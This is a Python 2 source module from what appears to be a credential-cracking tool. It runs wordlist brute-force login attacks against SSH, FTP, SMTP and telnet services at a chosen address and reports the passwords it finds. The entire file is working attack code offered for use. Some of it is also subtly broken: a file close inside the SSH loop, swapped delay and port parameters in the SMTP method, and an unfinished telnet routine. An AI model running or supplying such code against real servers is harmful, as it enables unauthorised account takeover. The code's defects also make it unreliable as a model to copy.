'''
protocols.py - Core module for network protocol bruteforcing

Category: Core 
Description: 
    This module provides the methods for bruteforcing network protocols.
    Using a multitude of Python libraries, protocols attempts to authenticate with
    the specified service through its respective library.  
    These include:
    - ssh       Port: 22
    - telnet    Port: 23
    - ftp       Port: 21
    - smtp      Port: 25

Dependencies: main > smtplib, paramiko, ftplib

Version: v1.0.0
Author: ex0dus
License: GPL-3.0 || https://opensource.org/licenses/GPL-3.0

'''

from src.main import *

class ProtocolBruteforce(object):
    def __init__(self, service, address, username, wordlist, port, delay):
        self.service = service
        self.address = address
        self.username = username
        self.wordlist = wordlist
        self.port = port
        self.delay = delay

        if self.address is None:
            print R + "[!] You need to provide an address for cracking! [!]" + W
            exit(1)
        print C + "[*] Address: %s" % self.address + W
        sleep(0.5)
        if self.port is None:
            if self.service == "ssh":
                self.port = 22
            elif self.service == "ftp":
                self.port = 21
            elif self.service == "smtp":
                print O + "[?] NOTE: SMTP has several ports for usage, including 25, 465, 587" + W
                self.port = 25
            elif self.service == "telnet":
                self.port = 23
            print O + "[?] Port not set. Automatically set to %s for you [?]" % self.port
        print C + "[*] Port: %s "  % self.port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % self.delay
        
        # Call respective methods
        if self.service == "ssh":
            os.system("mkdir tmp/")
            self.sshBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
        elif self.service == "ftp":
            self.ftpBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
        elif self.service == "smtp":
            self.smtpBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)
        elif self.service == "telnet":
            self.telnetBruteforce(self.address, self.username, self.wordlist, self.port, self.delay)

        
    ## SSH - Secure SHell, connect AND bruteforce

    def ssh_connect(self, address, username, password, port, code=0):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        paramiko.util.log_to_file("tmp/ssh.log")

        try:
            # Connecting! Errors are indicated by code variable.
            ssh.connect(address, port=int(port), username=username, password=password)
        except paramiko.AuthenticationException:
            # Password did not authenticate.
            code = 1
        except socket.error, e:
            # Something went wrong.
            print R + "[!] Error: Connection Failed. [!]" + W
            code = 2

        ssh.close()
        return code

    def sshBruteforce(self, address, username, wordlist, port, delay):
        wordlist = open(wordlist, 'r')
        # Processing wordlist...
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                response = self.ssh_connect(address, username, password, port)
                if response == 0:
                    print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                elif response == 1:
                    print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
                    sleep(delay)
                elif response == 2:
                    print R + "[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]" + W
                    exit()
            except Exception as e:
                print R + ("Error caught! %s" % e) + W 
                pass
            except KeyboardInterrupt:
                exit(1)

            wordlist.close()
        
    def ftpBruteforce(self, address, username, wordlist, port, delay):
        wordlist = open(wordlist, 'r')
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                ftp = ftplib.FTP()
                ftp.connect(address, port)
                ftp.login(username, password)
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                ftp.quit()
            except ftplib.error_perm:
                 print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
                 sleep(delay)
            except ftplib.all_errors as e:
                print R + ("Error caught! %s" % e) + W  
            except KeyboardInterrupt:
                ftp.quit()
                exit(1)

    ## SMTP - email

    def smtpBruteforce(self, address, username, wordlist, delay, port):
        wordlist = open(wordlist, 'r')
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                s = smtplib.SMTP(str(address), port)
                s.ehlo()
                s.starttls()
                s.ehlo
                s.login(str(username), str(password))
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                s.close()
            except smtplib.SMTPAuthenticationError:
                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
                sleep(delay)
            except Exception as e:
                print R + ("Error caught! %s" % e) + W 
            except KeyboardInterrupt:
                s.close()
                exit(1)
            

    def telnetBruteforce(self, address, username, wordlist, port, delay):
        telnet = telnetlib.Telnet(address)
        telnet.read_until("login: ")
        wordlist = open(wordlist, 'r')
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                telnet.write(username + "\n")
                telnet.read_until("Password: ")
                telnet.write(password + "\n")
            except socket.error:
                print R + "[!] Error: Connection Failed. [!]" + W
            # TODO: write output and handle error
            except KeyboardInterrupt:
                telnet.close()
                exit(1)
                